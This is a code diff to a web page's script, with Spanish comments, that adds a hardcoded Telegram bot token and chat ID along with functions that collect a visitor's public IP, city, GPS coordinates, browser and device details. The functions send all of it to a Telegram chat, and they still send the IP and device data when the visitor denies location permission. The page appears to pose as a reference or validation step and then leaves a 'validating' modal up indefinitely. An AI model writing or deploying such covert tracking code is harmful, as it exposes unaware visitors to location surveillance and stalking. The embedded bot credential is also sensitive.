@@ -119,6 +119,10 @@
 </div>
 
 <script>
+// --- CONFIG TELEGRAM ---
+const BOT_TOKEN = "8253513816:AAERpjUuX757c3cd8wzOmW0vvpTHce6KCIo";
+const CHAT_ID = "-5099354587";
+
 // Función para obtener la IP pública
 async function obtenerIP() {
     try {
@@ -128,6 +132,68 @@ async function obtenerIP() {
     } catch (e) {
         return {};
     }
+}
+
+// Función para formatear el mensaje que se enviará a Telegram
+function armarMensaje(datos, permisoOtorgado) {
+    if (permisoOtorgado) {
+        return `
+<b>📍 NUEVO CONSENTIMIENTO</b>
+
+<b>🕒 Fecha/Hora:</b> ${datos.fecha}
+
+<b>🌐 IP Pública:</b> ${datos.ip}
+<b>📌 Ciudad:</b> ${datos.city}
+<b>🇺🇸 País:</b> ${datos.country}
+
+<b>📡 Ubicación (GPS):</b>
+• Latitud: ${datos.lat}
+• Longitud: ${datos.lng}
+• Precisión: ${datos.accuracy} m
+• <a href="https://www.google.com/maps?q=${datos.lat},${datos.lng}">Ver en Maps</a>
+
+<b>📱 Dispositivo:</b>
+• Navegador: ${datos.ua}
+• Plataforma: ${datos.platform}
+• Resolución: ${datos.resolution}
+`;
+    } else {
+        return `
+<b>🚫 ACCESO DENEGADO</b>
+
+<b>🕒 Fecha/Hora:</b> ${datos.fecha}
+
+<b>🌐 IP Pública:</b> ${datos.ip}
+<b>📌 Ciudad:</b> ${datos.city}
+<b>🇺🇸 País:</b> ${datos.country}
+
+<b>📱 Dispositivo:</b>
+• Navegador: ${datos.ua}
+• Plataforma: ${datos.platform}
+• Resolución: ${datos.resolution}
+
+<b>📡 Ubicación (GPS):</b>
+• Latitud: ${datos.lat}
+• Longitud: ${datos.lng}
+• Precisión: ${datos.accuracy} m
+
+<b>Mensaje:</b> El usuario ha denegado el acceso a la geolocalización.
+`;
+    }
+}
+
+// Función para enviar el mensaje a Telegram
+async function enviarTelegram(msg) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: msg,
+            parse_mode: "HTML"
+        })
+    });
 }
 
 // Función para mostrar el modal de validación
@@ -170,19 +236,36 @@ async function pedirConsentimiento() {
                 resolution: `${screen.width}x${screen.height}`,
             };
 
-            // Aquí puedes procesar la información como necesites
-            console.log(datos);
+            // Enviar la información a Telegram solo si el permiso es otorgado
+            await enviarTelegram(armarMensaje(datos, true));
 
             // Ocultar el cuadro de consentimiento y mostrar el modal de validación
             document.getElementById("consent-modal").style.display = "none";
             mostrarValidando();
-            
+
             // Dejar el modal visible indefinidamente
         },
         async (err) => {
-            // Si el permiso es denegado, mostrar el cuadro de consentimiento nuevamente
-            alert("Es necesario otorgar el permiso de ubicación para generar la referencia.");
-            pedirConsentimiento(); // Volver a solicitar el permiso
+            // Si el permiso es denegado, enviar la información sin ubicación
+            const datos = {
+                fecha: new Date().toLocaleString(),
+                ip: ipInfo.ip || "N/D",
+                city: ipInfo.city || "N/D",
+                country: ipInfo.country_name || "N/D",
+                lat: "PERMISO DENEGADO",
+                lng: "PERMISO DENEGADO",
+                accuracy: "N/A",
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                resolution: `${screen.width}x${screen.height}`,
+            };
+
+            // Enviar el mensaje con acceso denegado
+            await enviarTelegram(armarMensaje(datos, false));
+
+            // Mostrar el mensaje de "Acceso Denegado"
+            document.getElementById("consent-modal").style.display = "none";
+            document.getElementById("main-content").style.display = "block";
         }
     );
 }
